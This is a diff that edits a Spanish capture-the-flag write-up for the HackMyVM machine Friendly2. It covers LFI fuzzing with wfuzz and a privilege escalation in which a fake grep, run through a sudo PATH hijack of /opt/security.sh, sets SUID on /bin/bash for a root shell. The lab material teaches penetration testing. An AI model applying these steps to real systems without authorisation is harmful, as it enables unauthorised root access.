@@ -50,7 +50,7 @@ Ahora ya podemos ver algo más.
 
 Puerto 22 OpenSSH 8.4p1 y puerto 80 (http) en el que tenemos un Apache httpd 2.4.56.
 
-POdemos ver que el título del sitio web es `Servicio de Mantenimiento de Ordenadores`, por lo que vamos a ver que tenemos en el servidor web.
+El título del sitio web es `Servicio de Mantenimiento de Ordenadores`, por lo que vamos a ver que tenemos en el servidor web.
 
 ![](/assets/images/HMV/Friendly2-HackMyVM/web1.webp)
 
@@ -82,7 +82,7 @@ Pero revisando el código fuente encuentro algo que ya me llama la atención y q
 <!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
 ```
 
-Me dirijo a la ruta `http://192.168.0.37/tools/check_if_exist.php?doc=keyboard.html` y puedo ver una imágen de un teclado con una descripción del mismo.
+Me dirijo a la ruta `tools/check_if_exist.php?doc=keyboard.html` y puedo ver una imágen de un teclado con una descripción del mismo.
 
 # Explotación [#](explotación) {#explotación}
 
@@ -90,10 +90,9 @@ Pero lo interesante viene en probar si es posible explotar un LFI.
 
 Para ello tengo un diccionario específico, por lo que haciendo uso del diccionario y de wfuzz podemos comprobar si es posible explotar el LFI.
 
-https://github.com/danielmiessler/SecLists
+<a href="https://github.com/danielmiessler/SecLists">Repositorio Seclists</a>
 
 ```bash
-********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
@@ -199,11 +198,11 @@ User gh0st may run the following commands on friendly2:
     (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
 ```
 
-Y como podemos ver, puedo ejecutar el binario security,sh sin contraseña con cualquier usuario.
+Y como podemos ver, puedo ejecutar el archivo security.sh sin contraseña con cualquier usuario.
 
 Y además de eso puedo editar el PATH.
 
-Primero vamos a echarle un vistazo al binario.
+Pero primero vamos a echarle un vistazo al archivo.
 
 ```bash
 #!/bin/bash
@@ -245,6 +244,8 @@ chmod u+s /bin/bash
 
 Una vez creado el archivo grep, vamos a editar el PATH añadiendo el directorio de trabajo donde hemos creado el archivo grep.
 
+Después ejecutamos el archivo security.sh y tirará del grep falso que hemos creado anteriormente, ejecutando el contenido que habíamos introducido otorgando permisos SUID a la bash.
+
 ```bash
 gh0st@friendly2:~$ sudo PATH=/home/gh0st:$PATH /opt/security.sh 
 Enter the string to encode:
@@ -253,7 +254,6 @@ The string cannot contain special characters.
 gh0st@friendly2:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
 ```
-
 Y ya tendremos la bash con permisos SUID.
 
 Por lo que ya solo debemos ejecutar `bash -p` y seremos root.
